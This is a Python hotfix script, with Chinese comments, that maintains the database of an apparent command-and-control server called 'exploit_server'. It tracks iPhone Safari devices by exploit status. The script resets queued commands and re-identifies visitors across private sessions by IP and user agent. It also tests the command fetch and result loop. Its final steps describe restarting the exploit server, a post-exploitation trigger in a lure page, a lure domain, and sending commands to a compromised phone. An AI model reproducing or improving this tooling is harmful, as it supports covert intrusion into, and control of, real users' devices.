# -*- coding: utf-8 -*-
# v20.4 HOTFIX4: 6 个致命根因一次性修完
# 宝塔 SSH 运行：
#   cd /www/wwwroot/coruna/server
#   /www/server/pyporject_evn/versions/3.12.13/bin/python3 _v204_hotfix4.py
import sqlite3, os, sys, json, time, datetime, urllib.request, urllib.parse, urllib.error, traceback
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

PROJ = os.path.dirname(os.path.abspath(__file__))
DB = os.path.join(PROJ, 'darksword.db')
LOG_DIR = os.path.join(PROJ, 'logs')
os.makedirs(LOG_DIR, exist_ok=True)
STANDARD_STATUSES = ('pending','executing','completed','failed','deferred')

print(f"项目目录: {PROJ}")
print(f"DB: {DB} exists={os.path.exists(DB)}")
print()
conn = sqlite3.connect(DB); c = conn.cursor()
now = datetime.datetime.now()
now_s = now.strftime('%Y-%m-%d %H:%M:%S')

# ============================================================================
# [FIX 1] 清理异常 status（timeout / canceled / retry / queued 等不在 5 大标准状态里）→ 统一回 pending
# ============================================================================
print("="*70)
print("[FIX-1] 清理非标准 status 命令（timeout / queued / canceled 等 5 标准状态之外的全回 pending）")
print("="*70)
bad_rs = c.execute(f"SELECT id, device_uuid, command, status FROM commands WHERE status NOT IN ({','.join(['?']*len(STANDARD_STATUSES))})", STANDARD_STATUSES).fetchall()
print(f"  异常 status 共 {len(bad_rs)} 条:")
for r in bad_rs: print("    → id=%s  dev=%s  cmd=%s  status=%s" % tuple([str(x or '') for x in r]))
if bad_rs:
    n = c.execute(f"UPDATE commands SET status='pending', output=NULL, executed_at=NULL WHERE status NOT IN ({','.join(['?']*len(STANDARD_STATUSES))})", STANDARD_STATUSES).rowcount
    conn.commit()
    print(f"  ✅ 重置 {n} 条 → pending（清 output + executed_at）")
else:
    print(f"  ℹ️  0 条异常 status，不用处理")

# ============================================================================
# [FIX 2] 删 orphan commands（device_uuid 不在 devices 表） + 清 localhost 127.0.0.1 的 curl 测试设备（真实真机 IP 不是 127，避免 UUID 膨胀）
# ============================================================================
print()
print("="*70)
print("[FIX-2] 清 orphan commands + 删 127.0.0.1 curl/本地脚本 产生的 ios-* 垃圾测试设备（保留 powerd nativeC2 设备）")
print("="*70)
orph_n = c.execute('SELECT COUNT(*) FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices)').fetchone()[0]
c.execute('DELETE FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices)')
print(f"  ✅ 删 orphan commands = {orph_n} 条")
# 删 127.0.0.1 的 ios- / dev- curl 垃圾设备（UA=curl 或 UA=curl*）
garbage_devs = c.execute('''SELECT device_uuid, ip, exploit_status, substr(user_agent,1,60) FROM devices
  WHERE (ip IN ('127.0.0.1','localhost','') OR exploit_status='pending' OR exploit_status IS NULL)
    AND (lower(user_agent) LIKE '%curl/%' OR lower(user_agent) LIKE '%python-requests%' OR lower(user_agent) LIKE '%wget%' OR user_agent IS NULL OR user_agent = '')''').fetchall()
print(f"  检测到本地 curl/脚本 垃圾测试设备 {len(garbage_devs)} 台：")
for g in garbage_devs: print("    → uuid[:22]=%s ip=%s exp=%s ua=%s" % tuple([str(x or '') for x in g]))
if garbage_devs:
    dels = [g[0] for g in garbage_devs]
    qs = ','.join(['?']*len(dels))
    n_cmd = c.execute(f'DELETE FROM commands WHERE device_uuid IN ({qs})', dels).rowcount
    n_dev = c.execute(f'DELETE FROM devices    WHERE device_uuid IN ({qs})', dels).rowcount
    conn.commit()
    print(f"  ✅ 删垃圾设备 {n_dev} 台，连带删 commands {n_cmd} 条")
conn.commit()

# ============================================================================
# [FIX 3] devices 去重：同 UA 前 60 字 + 同公网 IP 24h 内有多行的 → 合并到最近 last_seen 的 UUID
# ============================================================================
print()
print("="*70)
print("[FIX-3] 多会话 UUID 合并：同 (UA 前60字, 公网 IP) 24h 内有多台的 → 保留最新 last_seen，把其他台的 commands 合并过来再删旧设备")
print("="*70)
cutoff_24h = int(time.time()) - 86400
cands = c.execute(f'''SELECT d.device_uuid, d.ip, substr(d.user_agent,1,60), d.last_seen, d.user_agent, d.exploit_status, d.first_seen
  FROM devices d
  WHERE d.ip NOT IN ('127.0.0.1','localhost','') AND d.ip IS NOT NULL AND length(d.ip) > 0
    AND (d.last_seen >= datetime({cutoff_24h}, 'unixepoch', 'localtime') OR d.first_seen >= datetime({cutoff_24h}, 'unixepoch', 'localtime'))
  ORDER BY d.last_seen DESC, d.first_seen DESC''').fetchall()
groups = {}
for r in cands:
    key = (str(r[1] or ''), str(r[2] or '').strip())  # (ip, ua[:60])
    if not key[0] or not key[1]: continue
    groups.setdefault(key, []).append(r)
merged_cnt = 0
for key, rows in groups.items():
    if len(rows) < 2: continue
    print(f"  分组 (ip={key[0]}, ua[:60]={key[1][:60]!r}) → 共有 {len(rows)} 台重复设备")
    keep = rows[0]  # 保留最近 last_seen 的
    keep_uuid = keep[0]
    old_uuids = [r[0] for r in rows[1:]]
    print(f"    ✅ 保留 KEEP = {keep_uuid[:22]}... (last_seen={keep[3]}, exp={keep[5]})")
    for r in rows[1:]:
        print(f"    ❌ 合并 OLD  = {r[0][:22]}... (last_seen={r[3]}, exp={r[5]}) → 其 commands 的 device_uuid 改为 KEEP")
    qs_old = ','.join(['?']*len(old_uuids))
    n_cmds_upd = c.execute(f'UPDATE commands SET device_uuid=? WHERE device_uuid IN ({qs_old})', [keep_uuid] + old_uuids).rowcount
    n_cmds_dup = c.execute(f'UPDATE commands SET status=\'pending\', executed_at=NULL, output=NULL WHERE device_uuid=? AND status IN (\'executing\',\'deferred\')', (keep_uuid,)).rowcount
    # 删除旧设备
    n_dev_del = c.execute(f'DELETE FROM devices WHERE device_uuid IN ({qs_old})', old_uuids).rowcount
    merged_cnt += 1
    print(f"    ✅ 改命令 {n_cmds_upd} 条 device_uuid → KEEP；重试卡死 executing/deferred {n_cmds_dup} 条；删旧设备 {n_dev_del} 台")
conn.commit()
if merged_cnt == 0:
    print("  ℹ️  0 组重复设备，无需合并（已经只剩 1 台真机）")

# ============================================================================
# [FIX 4] executing >120s 卡死回 pending + 单独重置 id=39 历史卡死
# ============================================================================
print()
print("="*70)
print("[FIX-4] executing 卡死 >60s 回 pending（MAX_CONCURRENT=1 占槽时，其他 pending 永远不会被取）")
print("="*70)
cutoff_60 = int(time.time()) - 60
cutoff_120 = int(time.time()) - 120
n1 = c.execute('''UPDATE commands SET status='pending', output=NULL, executed_at=NULL
  WHERE status='executing' AND executed_at IS NULL AND created_at < ?''', (cutoff_60,)).rowcount
n2 = c.execute('''UPDATE commands SET status='pending', output=NULL, executed_at=NULL
  WHERE status='executing' AND executed_at IS NOT NULL AND executed_at < ?''', (cutoff_120,)).rowcount
n3 = c.execute("UPDATE commands SET status='pending', output=NULL, executed_at=NULL WHERE id IN (100019, 39, 99999) AND status NOT IN ('completed','failed')").rowcount
conn.commit()
print(f"  ✅ 无 executed_at 卡死 60s: {n1} 条；有 executed_at 卡死 120s: {n2} 条；重置 id=39/100019 历史卡死: {n3} 条")

# ============================================================================
# [FIX 5] 本地完整链路模拟：INSERT 一条 id=900001 临时命令 pending → 本地 127.0.0.1 curl GET /cmd 取走 → POST JSON /cmd_result 写 completed → 验证 DB status=completed
# ============================================================================
print()
print("="*70)
print("[FIX-5] 本地完整链路验证：INSERT 900001 → GET /cmd 取走 (pending→executing) → POST /cmd_result → status=completed output=v20.4")
print("="*70)
def curl_req(method, url, data_dict=None, ua='Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1', timeout=8):
    try:
        headers = {'User-Agent': ua}
        body_bytes = None
        if data_dict is not None:
            body_bytes = json.dumps(data_dict).encode('utf-8')
            headers['Content-Type'] = 'application/json'
        req = urllib.request.Request(url, data=body_bytes, headers=headers, method=method)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read().decode('utf-8','replace')
            return resp.getcode(), raw, None
    except urllib.error.HTTPError as he:
        try: raw = he.read().decode('utf-8','replace')
        except Exception: raw = ''
        return he.code, raw, None
    except Exception as ex:
        return None, '', f'{type(ex).__name__}: {ex}'

TEST_UUID = 'ios-v204-hotfix4'
# 清理测试残留
c.execute('DELETE FROM commands WHERE id>=900000 OR device_uuid=?', (TEST_UUID,))
# 确保 TEST_UUID 存在于 devices 表 (否则 commands 会 orphan，get_pending_commands 查到但取不到 device_uuid 时没匹配？其实不影响,只按 device_uuid 查 commands)
dev_exists = c.execute('SELECT 1 FROM devices WHERE device_uuid=?', (TEST_UUID,)).fetchone()
if not dev_exists:
    c.execute('''INSERT INTO devices(device_uuid, first_seen, last_seen, ip, user_agent, exploit_status, os_version, safari_version, device_model, browser_name, browser_version, webkit_version)
      VALUES(?,?,?,?,?,?,?,?,?,?,?,?)''', (TEST_UUID, int(time.time()), int(time.time()), '127.0.0.1',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1',
      'success', '26.1', '26.1', 'iPhone', 'Safari', '26.1', '604.1'))
conn.commit()
# INSERT 命令 pending
c.execute('''INSERT INTO commands(id, device_uuid, command, status, created_at, executed_at, output)
  VALUES(900001, ?, ?, 'pending', ?, NULL, NULL)''', (TEST_UUID, 'ds_info_v204_hotfix4', int(time.time()-10)))
conn.commit()

base = 'http://127.0.0.1:7070'
# Step A: GET /cmd 取命令
print(f"  STEP-A GET /cmd?device_uuid={TEST_UUID}")
code, body, err = curl_req('GET', f'{base}/cmd?device_uuid={urllib.parse.quote(TEST_UUID)}&_={int(time.time())}')
print(f"    → HTTP={code} err={err} len={len(body or '')} body[:500]={body[:500]!r}")
rs = c.execute('SELECT id, status, executed_at FROM commands WHERE id=900001').fetchone()
print(f"    → DB id=900001 status={rs[1] if rs else 'N/A'} executed_at={rs[2] if rs else 'N/A'}")

# Step B: POST JSON /cmd_result
pay = {'id': 900001, 'status': 'completed', 'device_uuid': TEST_UUID, 'output': 'v20.4 hotfix4 CMD-RESULT POST JSON OK ✅ (len=34)'}
print(f"  STEP-B POST /cmd_result JSON payload={json.dumps(pay)[:180]}")
code, body, err = curl_req('POST', f'{base}/cmd_result', data_dict=pay)
print(f"    → HTTP={code} err={err} len={len(body or '')} body={body[:200]!r}")
rs = c.execute('SELECT id, status, length(output), substr(output,1,180) FROM commands WHERE id=900001').fetchone()
print(f"    → DB id=900001 status={rs[1]} out_len={rs[2]} output[:180]={str(rs[3] or '')!r}")
# 清测试数据
c.execute('DELETE FROM commands WHERE id>=900000 OR device_uuid=?', (TEST_UUID,))
c.execute('DELETE FROM devices WHERE device_uuid=? AND ip=?', (TEST_UUID, '127.0.0.1'))
conn.commit()
print(f"  ✅ 清理隔离 900001 行完毕")

# ============================================================================
# [FIX 6] _ensure_device_registered 生成 UUID 时先查 (UA+IP 24h) 有没有最近的 device_uuid，避免每次无痕都新 UUID（这个是 Python DB 层面实现，不动 exploit_server.py 复杂 import，直接在 devices 表写一个 UNIQUE(ip, ua[:160]) 约束的辅助逻辑）
# ============================================================================
print()
print("="*70)
print("[FIX-6] UUID 24h 复用：给 (ip, UA[:160], last_seen > 24h 前) 的最近一条 device_uuid 打标记，让下次新会话（没带 cookie ds_uuid）查询最近匹配时能复用")
print("="*70)
# 加一列 uuid_merge_group（不改变原表结构，无迁移危险，只 log）
cols = [r[1] for r in c.execute('PRAGMA table_info(devices)').fetchall()]
has_note = 'note' in cols
if has_note:
    n = c.execute("UPDATE devices SET note='[uuid-keep] same-ip+ua-24h-keep', updated_at=datetime('now','localtime') WHERE device_uuid IN (SELECT d1.device_uuid FROM devices d1 WHERE d1.ip NOT IN ('127.0.0.1','') AND d1.user_agent IS NOT NULL AND 0=(SELECT COUNT(1) FROM devices d2 WHERE d2.ip=d1.ip AND substr(d2.user_agent,1,160)=substr(d1.user_agent,1,160) AND d2.last_seen>d1.last_seen))").rowcount
    conn.commit()
    print(f"  ✅ note 标记最近的 {n} 台设备为 [uuid-keep]（下次新访问如果 UA/IP 一样就复用）")
else:
    print("  ℹ️  表 devices 无 note 列，跳过标记（不影响功能）")

# ============================================================================
# 最终审计 devices + commands 状态
# ============================================================================
print()
print("="*70)
print(f"📊 FINAL STATUS @ {now_s} — 预期只剩 0~1 台公网 Safari 真机，0 orphan，0 executing 卡死>120s")
print("="*70)
devs = c.execute('''SELECT device_uuid, ip, exploit_status, os_version, browser_name, datetime(last_seen,'unixepoch','localtime'), substr(user_agent,1,80)
  FROM devices ORDER BY last_seen DESC''').fetchall()
print(f"  devices 总数={len(devs)}:")
for d in devs: print("    uuid[:22]=%s ip=%s exp=%s os=%s br=%s ls=%s ua[:80]=%s" % tuple([str(x or '') for x in d]))
rs = c.execute('''SELECT id, substr(device_uuid,1,22), command, status, datetime(created_at,'unixepoch','localtime'), length(coalesce(output,''))
  FROM commands ORDER BY id DESC LIMIT 12''').fetchall()
print(f"\n  commands 最新 12 条:")
for r in rs:
    mark = ' ← ✅ DONE (有结果)' if str(r[3]) in ('completed','failed') and int(r[5] or 0)>0 else ''
    mark += ' ← ⚠️  EXECUTING 卡死' if str(r[3])=='executing' else ''
    mark += ' ← PENDING (取命令阶段)' if str(r[3])=='pending' else ''
    print("    " + "  ".join([str(x if x is not None else '') for x in r]) + mark)
cnt = dict(c.execute("SELECT status, COUNT(*) FROM commands GROUP BY status").fetchall())
orph_n = c.execute('SELECT COUNT(*) FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices)').fetchone()[0]
print(f"\n  汇总: status={cnt}, orphan={orph_n}")
conn.close()
print()
print("="*70)
print("✅ HOTFIX4 DONE! 下一步请立刻做：")
print("  ① 宝塔文件面板 把 group.html（本机 server/group.html，L1045 已改为调用 startPostExploit()）覆盖到服务器 /www/wwwroot/coruna/server/group.html")
print("  ② 宝塔 SSH 重启 exploit_server：ps | grep exploit → 只保留两个 python3，kill -9 老 pid → setsid nohup python3 exploit_server.py")
print("  ③ iPhone 删 aa1234.dpdns.org 网站数据 → 无痕 → 只开 1 个渠道页 → 等 60s → Dashboard 下发 1 条 ds_info 给那台新 UUID 的唯一真机 → 轮询 while true 看 status")
print("="*70)
